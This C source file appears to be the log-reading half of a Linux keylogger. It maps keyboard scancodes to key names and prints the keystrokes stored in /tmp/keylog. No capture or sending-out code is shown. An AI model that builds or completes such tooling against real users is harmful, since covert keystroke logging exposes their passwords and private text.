#include <stdio.h>
#include <stdlib.h>

#define LOG_FILE "/tmp/keylog"
#define BUF_SIZE 1024

static int buf[BUF_SIZE];
static char *keycode[256] = 
{
"", "<Esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
"-", "=", "<Backspace>", "<Tab>",
"q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
"[", "]", "<Enter>", "<ctrl-left>", "a", "s", "d", "f", "g", "h", "j", "k", "l",
";", "'", "","<shift-left>","\\","z", "x", "c", "v", "b", "n", "m",
",", ".", "/", "<shift-right>", "", "<alt-left>", "", "<CapsLK>",
"<f1>", "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>", "<f10>","<NumLK>", "<ScrLK>", "", "", "", "", "", "", "", "", "", "",
"\\", "<f11>", "<f12>", "", "", "", "", "", "", "", "", "<cirl-right>",
"", "<sysrq>"
};

/*
 * TODO: make keycode[] entire not use the init_keycode()
 * Here ,I just practice the keymap in my keyboard
 */
void init_keycode(void)
{
	keycode[41] = "`";
	keycode[87] = "<f11>";
	keycode[88] = "<f12>";
	keycode[100] = "<alt-right>";
	keycode[102] = "[Home]";
	keycode[103] = "[up]";
	keycode[104] = "[PgUp]";
	keycode[105] = "[left]";
	keycode[108] = "[down]";
	keycode[110] = "[Insert]";
	keycode[109] = "[PgDn]";
	keycode[107] = "[End]";
	keycode[111] = "[Delete]";
	keycode[119] = "[Pause]";
	keycode[143] = "[Fn]";
	keycode[106] = "[right]";
}

void readlog(void)
{
	FILE *fp;
	int n;
	int i;

	init_keycode();

	fp = fopen(LOG_FILE, "r");
	if (fp == NULL) {
		perror("fopen");
		exit(1);
	}

	while((n = fread(buf, sizeof(int), BUF_SIZE, fp)) > 0) {
		if (ferror(fp)) {
			perror("fread");
			exit(1);
		}
		for (i = 0; i < n; i++)
			if (buf[i] < 255 && buf[i] >=0)
				printf("%s", keycode[buf[i]]);
		fflush(stdin);
	}

	if (ferror(fp)) {
		perror("fread");
		exit(1);
	}
	printf("\n");
	fclose(fp);
}
